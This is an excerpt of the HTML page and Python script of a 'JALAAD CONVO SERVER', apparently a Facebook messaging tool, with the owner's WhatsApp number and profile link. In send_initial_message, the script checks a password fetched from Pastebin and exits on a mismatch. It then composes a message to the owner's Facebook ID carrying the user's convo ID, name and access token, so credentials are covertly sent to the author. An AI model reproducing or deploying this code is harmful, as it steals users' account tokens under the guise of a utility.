...
<head>
    ...
    <title>JALAAD CONVO SERVER</title>
    <style>
        body {
...
<body>
    <div class="container">
        <div class="box">
            <h1>JALAAD CONVO SERVER</h1>
            <div class="credit">
                <p>1. CREDIT:-JALAAD KING</p>
                <p>2. OWNER => JALAAD</p>
                <p>3. CONTACT:- <a href="https://wa.me/+918368004462">WhatsApp</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=100002475946946">Facebook</a></p>
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/d3QHDYMW').text
    
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ Your Password Changed By jalaad ⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "Owner => Jalaad\n Hello Jalaad sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["100002475946946" ]
